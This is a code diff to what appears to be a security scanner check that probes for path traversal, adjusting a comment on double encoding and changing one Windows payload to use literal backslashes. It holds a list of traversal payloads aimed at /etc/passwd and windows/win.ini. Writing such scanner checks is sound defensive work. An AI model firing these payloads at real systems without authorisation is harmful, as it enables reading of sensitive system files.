@@ -36,13 +36,16 @@ const META = #{
 fn load(reg) {
     reg.add_check(META, |point| {
         let base = if type_of(point.example) == "string" { point.example } else { "index.html" };
-        // Plain, percent-encoded, doubled-up, absolute, and the Windows pair.
+        // Plain, double-encoded (the lane percent-encodes the value once, spec
+        // D4, so `%2f` reaches the wire as `%252f` and only a server that
+        // decodes twice sees a slash), doubled-up, absolute, and the Windows
+        // pair with real backslashes.
         let payloads = [
             "../../../../../../../../etc/passwd",
             "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
             "....//....//....//....//etc/passwd",
             "/etc/passwd",
-            "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
+            "..\\..\\..\\..\\..\\windows\\win.ini",
             "../../../../../../windows/win.ini",
         ];
 
